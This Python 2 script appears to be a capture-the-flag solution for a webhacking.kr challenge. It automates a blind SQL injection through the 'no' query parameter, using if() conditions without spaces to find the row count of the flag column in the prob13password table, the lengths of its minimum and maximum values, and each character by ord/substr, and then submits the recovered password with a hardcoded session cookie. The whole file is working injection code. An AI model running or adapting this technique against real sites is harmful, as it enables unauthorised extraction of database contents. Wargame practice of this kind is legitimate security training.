#-*- coding: utf-8 -*-
import sys
import urllib2
import CookieManager

challengeUrl = "http://webhacking.kr/challenge/web/web-10/index.php"
trueCondition  = "<td>1</td>"
flagCount = 0
isFoundFlagCount = False
CookieManager.addCookie("PHPSESSID", "eabcdebaaabceddaabeabddefcabcdbe")

print "[*] Find flag count from prob13password"

for flagCount in range(1, 20):
    parameter = "?no=if((select(count(flag))from(prob13password))in(%d),1,2)" % flagCount
    
    httpRequest = urllib2.Request(challengeUrl + parameter)
    httpRequest.add_header("Cookie", CookieManager.getCookie())
    
    httpConnection = None
    try:
        httpConnection = urllib2.urlopen(httpRequest)
        httpResponse = httpConnection.read()
        print "[*] Blind SQL Injection...", flagCount
        if httpResponse.find(trueCondition) > 0:
            print "[+] FIND IT! flag count is [", flagCount, "]"
            isFoundFlagCount = True
            break
    except:
        raise
    finally:
        if httpConnection != None:
            httpConnection.close()

if not isFoundFlagCount:
    sys.exit(-1)

minFlagLength = 0
isFoundMinFlagLength = False

print
print "[*] Find min(flag) length from prob13password"

for minFlagLength in range(1, 30):
    parameter = "?no=if((select(length(min(flag)))from(prob13password))in(%d),1,2)" % minFlagLength
    
    httpRequest = urllib2.Request(challengeUrl + parameter)
    httpRequest.add_header("Cookie", CookieManager.getCookie())
    
    httpConnection = None
    try:
        httpConnection = urllib2.urlopen(httpRequest)
        httpResponse = httpConnection.read()
        print "[*] Blind SQL Injection...", minFlagLength
        if httpResponse.find(trueCondition) > 0:
            print "[+] FIND IT! min(flag) length is [", minFlagLength, "]"
            isFoundMinFlagLength = True
            break
    except:
        raise
    finally:
        if httpConnection != None:
            httpConnection.close()

if not isFoundMinFlagLength:
    sys.exit(-1)

maxFlagLength = 0
isFoundMaxFlagLength = False

print
print "[*] Find max(flag) length from prob13password"

for maxFlagLength in range(1, 30):
    parameter = "?no=if((select(length(max(flag)))from(prob13password))in(%d),1,2)" % maxFlagLength
    
    httpRequest = urllib2.Request(challengeUrl + parameter)
    httpRequest.add_header("Cookie", CookieManager.getCookie())
    
    httpConnection = None
    try:
        httpConnection = urllib2.urlopen(httpRequest)
        httpResponse = httpConnection.read()
        print "[*] Blind SQL Injection...", maxFlagLength
        if httpResponse.find(trueCondition) > 0:
            print "[+] FIND IT! max(flag) length is [", maxFlagLength, "]"
            isFoundMaxFlagLength = True
            break
    except:
        raise
    finally:
        if httpConnection != None:
            httpConnection.close()

if not isFoundMaxFlagLength:
    sys.exit(-1)

minFlagValue = ""
for caretIndex in range(1, minFlagLength+1):
    print
    print "[*] Blind SQL Injection...", caretIndex, "", 
    for charIndex in range(0x61, 0x7f) + range(0x20, 0x65):
        sys.stdout.write(".")
        parameter = "?no=if((select(ord(substr(min(flag),%d,1)))from(prob13password))in(%d),1,2)" % (caretIndex, charIndex)
        
        httpRequest = urllib2.Request(challengeUrl + parameter)
        httpRequest.add_header("Cookie", CookieManager.getCookie())
        
        httpConnection = None
        try:
            httpConnection = urllib2.urlopen(httpRequest)
            httpResponse = httpConnection.read()
            if httpResponse.find(trueCondition) > 0:
                print 
                print "[+] FIND IT!", chr(charIndex)
                minFlagValue += chr(charIndex)
                break
        except:
            raise
        finally:
            if httpConnection != None:
                httpConnection.close()

print "[+] min(flag) is [", minFlagValue, "]"

maxFlagValue = ""
for caretIndex in range(1, maxFlagLength+1):
    print
    print "[*] Blind SQL Injection...", caretIndex, "", 
    for charIndex in range(0x61, 0x7f) + range(0x20, 0x65):
        sys.stdout.write(".")
        parameter = "?no=if((select(ord(substr(max(flag),%d,1)))from(prob13password))in(%d),1,2)" % (caretIndex, charIndex)
        
        httpRequest = urllib2.Request(challengeUrl + parameter)
        httpRequest.add_header("Cookie", CookieManager.getCookie())
        
        httpConnection = None
        try:
            httpConnection = urllib2.urlopen(httpRequest)
            httpResponse = httpConnection.read()
            if httpResponse.find(trueCondition) > 0:
                print 
                print "[+] FIND IT!", chr(charIndex)
                maxFlagValue += chr(charIndex)
                break
        except:
            raise
        finally:
            if httpConnection != None:
                httpConnection.close()

print "[+] max(flag) is [", maxFlagValue, "]"

print "[*] Auth Challenge 13"
httpRequest = urllib2.Request(challengeUrl + "?password=" + minFlagValue)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
